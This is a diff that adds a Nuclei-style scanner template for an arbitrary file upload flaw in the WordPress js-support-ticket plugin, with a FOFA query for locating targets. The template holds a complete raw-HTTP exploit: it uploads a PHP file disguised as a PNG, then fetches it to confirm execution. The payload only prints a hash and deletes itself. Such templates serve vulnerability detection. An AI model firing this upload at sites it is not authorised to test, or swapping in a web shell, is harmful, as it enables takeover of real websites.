@@ -1,0 +1,46 @@
+id: wordpress-js-support-ticket-fileupload
+
+info:
+  name: wordpress-js-support-ticket-fileupload
+  author: HackTwo
+  severity: high
+  description: wordpress js-support-ticket 存在文件上传漏洞。
+  tags: wordpress,fileupload
+  metadata:
+    fofa-qeury: body="wp-content/plugins/js-support-ticket"
+
+variables:
+  rand8: "{{rand_text_numeric(8)}}"
+
+http:
+  - raw:
+      - |              
+        POST /wp-admin/?page=configuration&task=saveconfiguration HTTP/1.1
+        Host: {{hostname}}
+        Content-Type: multipart/form-data; boundary=--------767099171
+        User-Agent: Mozilla/5.0 
+
+        ----------767099171
+        Content-Disposition: form-data; name="action"
+
+        configuration_saveconfiguration
+        ----------767099171
+        Content-Disposition: form-data; name="form_request"
+
+        jssupportticket
+        ----------767099171
+        Content-Disposition: form-data; name="support_custom_img"; filename="{{rand8}}.php"
+        Content-Type: image/png
+
+        <?php echo md5(123);unlink(__FILE__);?>
+        ----------767099171-- 
+      - |              
+        GET /wp-content/plugins/js-support-ticket/jssupportticketdata/supportImg/{{rand8}}.php HTTP/1.1
+        Host: {{hostname}}
+        User-Agent: Mozilla/5.0  
+               
+    matchers:     
+      - type: dsl
+        name: fileupload
+        dsl:
+          - '(status_code==200 && contains(body, "202cb962ac59075b964b07152d234b70") && contains(header, "text/html"))'
